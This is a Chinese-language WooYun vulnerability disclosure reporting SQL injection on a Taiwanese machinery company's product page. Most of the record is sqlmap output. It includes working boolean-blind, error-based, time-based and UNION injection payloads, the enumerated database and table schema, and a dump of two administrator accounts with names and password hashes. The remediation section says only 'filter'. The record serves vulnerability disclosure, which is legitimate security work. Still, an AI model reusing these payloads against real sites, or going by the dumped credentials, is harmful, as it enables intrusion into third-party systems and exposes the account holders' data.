wybug_title: 頂瑞機械股份有限公司sql注入漏洞1枚（臺灣地區）

wybug_detail: 漏洞详情 披露状态：   									2015-12-28：	细节已通知厂商并且等待厂商处理中									2015-12-28：	厂商已经确认，细节仅向厂商公开									2016-01-07：	细节向核心白帽子及相关领域专家公开									2016-01-17：	细节向普通白帽子公开									2016-01-27：	细节向实习白帽子公开									2016-02-09：	细节向公众公开  简要描述： rt 详细说明：  rt   漏洞证明：  注入点： http://**.**.**.**/en/productinfo.php?id=52sqlmap identified the following injection points with a total of 59 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=52 AND 6643=6643    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=52 AND (SELECT 1160 FROM(SELECT COUNT(*),CONCAT(0x7162626b71,(SELECT (ELT(1160=1160,1))),0x7171706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: id=52 OR SLEEP(5)    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: id=-2108 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162626b71,0x58685a65615847726e49,0x7171706b71),NULL,NULL,NULL,NULL-- ---web application technology: Apache, PHP 5.2.11back-end DBMS: MySQL 5.0available databases [2]:[*] DBL01048[*] information_schemaweb application technology: Apache, PHP 5.2.11back-end DBMS: MySQL 5.0Database: DBL01048[11 tables]+------------+| about      || admin      || block_ip   || company    || config     || contact    || job        || mailserver || pro        || pro_cate   || pro_class  |+------------+Database: DBL01048Table: admin[12 columns]+-----------+--------------+| Column    | Type         |+-----------+--------------+| admin     | varchar(50)  || control   | tinyint(4)   || demo      | varchar(200) || email     | varchar(50)  || id        | int(11)      || isopen    | tinyint(4)   || issend    | tinyint(4)   || loginip   | varchar(50)  || logintime | datetime     || name      | varchar(100) || pwd       | varchar(100) || riqi      | datetime     |+-----------+--------------+Database: DBL01048Table: admin[2 entries]+---------------+-----------------------+------+----------------------------------+| admin         | email                 | name | pwd                              |+---------------+-----------------------+------+----------------------------------+| administrator | admin@**.**.**.** | 管理部  | 0c8c40ebd32208d16317ecd55e7b6dc7 || trmc310       | admin@**.**.**.** | 邱楠凱  | 0c8c40ebd32208d16317ecd55e7b6dc7 |+---------------+-----------------------+------+----------------------------------+   修复方案：  过滤   版权声明：转载请注明来源 love_is_all@乌云
